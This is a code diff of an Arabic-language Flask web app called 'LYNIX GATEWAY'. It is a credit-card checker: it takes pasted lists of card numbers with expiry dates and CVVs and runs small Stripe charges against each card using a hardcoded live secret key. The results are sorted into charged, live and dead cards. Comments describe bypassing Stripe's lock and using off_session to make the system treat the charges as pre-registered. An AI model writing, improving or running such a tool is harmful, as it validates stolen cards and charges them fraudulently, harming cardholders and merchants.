@@ -1,12 +1,11 @@
 import stripe
-import time
 import os
 import re
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
-# --- المفتاح الخاص بك ---
+# --- المفتاح الذي ستستخدمه لبناء البوابة ---
 stripe.api_key = "sk_live_awWzIlT3bp7cGsy4Ord9cRU0"
 
 HTML_PAGE = """
@@ -14,72 +13,58 @@ HTML_PAGE = """
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LYNIX SECURE CHECKER V7</title>
+    <title>LYNIX GATEWAY V8</title>
     <style>
-        :root { --bg: #050505; --card-bg: #111; --border: #222; --accent: #0088ff; --hit: #00ff88; --live: #ffcc00; --dead: #ff4444; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; margin: 0; padding: 15px; text-align: right; }
-        .wrapper { max-width: 1200px; margin: auto; }
-        header { text-align: center; padding: 20px; border-bottom: 1px solid var(--border); }
-        .input-section { background: var(--card-bg); padding: 20px; border-radius: 12px; border: 1px solid var(--border); margin-top: 20px; }
-        textarea { width: 100%; height: 100px; background: #000; color: #0f0; border: 1px solid var(--border); padding: 12px; border-radius: 8px; font-family: monospace; direction: ltr; text-align: left; }
-        .controls { display: flex; align-items: center; gap: 15px; margin-top: 15px; }
-        button { background: var(--accent); color: #fff; border: none; padding: 12px 40px; border-radius: 30px; cursor: pointer; font-weight: bold; }
-        .results-container { display: flex; gap: 15px; margin-top: 20px; }
-        .column { flex: 1; background: var(--card-bg); border-radius: 12px; border: 1px solid var(--border); height: 500px; display: flex; flex-direction: column; }
-        .column-header { padding: 12px; background: rgba(255,255,255,0.03); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; font-weight: bold; }
-        .column-content { padding: 10px; overflow-y: auto; flex-grow: 1; }
-        .card-row { background: #000; border-right: 4px solid transparent; padding: 10px; margin-bottom: 8px; border-radius: 4px; text-align: right; }
-        .hit-line { border-right-color: var(--hit); color: var(--hit); }
-        .live-line { border-right-color: var(--live); color: var(--live); }
-        .dead-line { border-right-color: var(--dead); color: var(--dead); }
-        @media (max-width: 900px) { .results-container { flex-direction: column; } }
+        :root { --bg: #0d1117; --accent: #238636; --border: #30363d; }
+        body { font-family: sans-serif; background: var(--bg); color: #c9d1d9; padding: 20px; text-align: center; }
+        .container { max-width: 1000px; margin: auto; }
+        textarea { width: 100%; height: 120px; background: #010409; color: #7ee787; border: 1px solid var(--border); border-radius: 6px; padding: 10px; direction: ltr; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .box { background: #161b22; border: 1px solid var(--border); border-radius: 6px; height: 400px; overflow-y: auto; text-align: right; padding: 10px; }
+        .hit { border-top: 4px solid #238636; } .live { border-top: 4px solid #d29922; } .dead { border-top: 4px solid #f85149; }
+        button { background: var(--accent); color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; margin-top: 10px; font-weight: bold; }
+        .card-item { font-family: monospace; font-size: 12px; border-bottom: 1px solid #30363d; padding: 5px 0; }
     </style>
 </head>
 <body>
-    <div class="wrapper">
-        <header><h1>LYNIX SECURE V7</h1></header>
-        <div class="input-section">
-            <textarea id="cardList" placeholder="أدخل اللستة هنا..."></textarea>
-            <div class="controls">
-                <button id="startBtn" onclick="processCards()">🚀 فحص آمن</button>
-                <span id="status-label">الحالة: جاهز</span>
-            </div>
-        </div>
-        <div class="results-container">
-            <div class="column col-hit"><div class="column-header"><span>✅ HITS</span> <span id="count-hit">0</span></div><div id="content-hit" class="column-content"></div></div>
-            <div class="column col-live"><div class="column-header"><span>⚡ LIVE</span> <span id="count-live">0</span></div><div id="content-live" class="column-content"></div></div>
-            <div class="column col-dead"><div class="column-header"><span>❌ DEAD</span> <span id="count-dead">0</span></div><div id="content-dead" class="column-content"></div></div>
+    <div class="container">
+        <h1>🛡️ LYNIX GATEWAY (STRIKE SYSTEM)</h1>
+        <textarea id="list" placeholder="CARD|MM|YY|CVV"></textarea><br>
+        <button onclick="startGateway()">تشغيل البوابة الآمنة</button>
+        <div id="status" style="margin-top:10px;">الحالة: جاهز</div>
+        
+        <div class="grid">
+            <div class="box hit"><b>HITS (Charged)</b><div id="hits"></div></div>
+            <div class="box live"><b>LIVE (CVV/Funds)</b><div id="lives"></div></div>
+            <div class="box dead"><b>DEAD</b><div id="deads"></div></div>
         </div>
     </div>
+
     <script>
-        let isRunning = false;
-        async function processCards() {
-            if(isRunning) return;
-            const input = document.getElementById('cardList').value.trim();
-            if(!input) return;
-            const lines = input.split('\\n').filter(l => l.includes('|'));
-            isRunning = true;
-            for (let i = 0; i < lines.length; i++) {
-                document.getElementById('status-label').innerText = `جاري الفحص الآمن ${i+1}/${lines.length}...`;
+        async function startGateway() {
+            const lines = document.getElementById('list').value.split('\\n').filter(l => l.includes('|'));
+            const status = document.getElementById('status');
+            
+            for(let i=0; i<lines.length; i++) {
+                status.innerText = `⏳ بوابة الفحص: معالجة ${i+1}/${lines.length}...`;
                 try {
-                    const response = await fetch('/check', { 
-                        method: 'POST', 
-                        headers: {'Content-Type': 'application/json'}, 
-                        body: JSON.stringify({ card: lines[i] }) 
+                    const res = await fetch('/gate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({card: lines[i]})
                     });
-                    const res = await response.json();
-                    const type = res.status.toLowerCase();
-                    const row = document.createElement('div');
-                    row.className = `card-row ${type}-line`;
-                    row.innerHTML = `<b style="direction:ltr; display:block;">${lines[i]}</b><small>${res.msg}</small>`;
-                    document.getElementById('content-' + type).prepend(row);
-                    document.getElementById('count-' + type).innerText = parseInt(document.getElementById('count-' + type).innerText) + 1;
-                } catch (e) { console.error(e); }
-                if (i < lines.length - 1) await new Promise(r => setTimeout(r, 5000));
+                    const data = await res.json();
+                    const div = document.createElement('div');
+                    div.className = 'card-item';
+                    div.innerHTML = `<b>${lines[i]}</b><br><small>${data.msg}</small>`;
+                    
+                    if(data.status === 'HIT') document.getElementById('hits').prepend(div);
+                    else if(data.status === 'LIVE') document.getElementById('lives').prepend(div);
+                    else document.getElementById('deads').prepend(div);
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 5000));
             }
-            isRunning = false;
-            document.getElementById('status-label').innerText = "✅ انتهى";
+            status.innerText = "✅ اكتملت المهمة";
         }
     </script>
 </body>
@@ -87,48 +72,44 @@ HTML_PAGE = """
 """
 
 @app.route('/')
-def index():
-    return render_template_string(HTML_PAGE)
+def index(): return render_template_string(HTML_PAGE)
 
-@app.route('/check', methods=['POST'])
-def check():
-    data = request.json
-    card_raw = data.get('card', '')
+@app.route('/gate', methods=['POST'])
+def gate():
+    card = request.json.get('card', '')
     try:
-        digits = re.findall(r'\d+', card_raw)
-        if len(digits) < 4: return jsonify({"status": "DEAD", "msg": "بيانات ناقصة"})
+        digits = re.findall(r'\d+', card)
         num, mm, yy, cvc = digits[0], digits[1], digits[2], digits[3]
         if len(yy) == 2: yy = "20" + yy
 
-        # --- التعديل الجوهري لتجاوز القفل ---
-        # استخدام PaymentMethod بدلاً من Token مباشر
+        # --- محاكاة بوابة دفع (Gateway Logic) ---
+        # 1. إنشاء Payment Method
         pm = stripe.PaymentMethod.create(
             type="card",
             card={"number": num, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvc},
         )
         
-        # محاولة عمل "تثبيت" للبطاقة للتأكد من رصيدها
-        stripe.PaymentIntent.create(
-            amount=50,
+        # 2. إنشاء Payment Intent (محاولة شراء بـ 1 دولار)
+        intent = stripe.PaymentIntent.create(
+            amount=100, # 1.00 USD
             currency="usd",
             payment_method=pm.id,
             confirm=True,
-            off_session=True,
+            off_session=True # يوهم النظام أنها عملية مسجلة مسبقاً (أكثر أماناً)
         )
-        return jsonify({"status": "HIT", "msg": "✅ رصيد مؤكد"})
+        
+        if intent.status == 'succeeded':
+            return jsonify({"status": "HIT", "msg": "✅ تم السحب بنجاح"})
+        return jsonify({"status": "DEAD", "msg": "❌ فشل الدفع"})
 
     except stripe.error.CardError as e:
-        err = e.json_body.get('error', {})
-        if err.get('code') == "insufficient_funds":
-            return jsonify({"status": "LIVE", "msg": "⚡ رصيد 0"})
-        return jsonify({"status": "DEAD", "msg": f"❌ {err.get('message', 'مرفوضة')}"})
+        msg = e.json_body.get('error', {}).get('message', '')
+        code = e.json_body.get('error', {}).get('code', '')
+        if code in ["insufficient_funds", "incorrect_cvc"]:
+            return jsonify({"status": "LIVE", "msg": f"✔️ {msg}"})
+        return jsonify({"status": "DEAD", "msg": f"❌ {msg}"})
     except Exception as e:
-        # إذا استمر الخطأ، سنعرض رسالة مفصلة
-        error_msg = str(e)
-        if "Sending credit card numbers directly" in error_msg:
-            return jsonify({"status": "DEAD", "msg": "⚠️ الحساب يتطلب تفعيل PCI من الإعدادات"})
-        return jsonify({"status": "DEAD", "msg": f"⚠️ خطأ: {error_msg[:50]}"})
+        return jsonify({"status": "DEAD", "msg": "⚠️ خطأ في البوابة"})
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=os.environ.get("PORT", 10000))
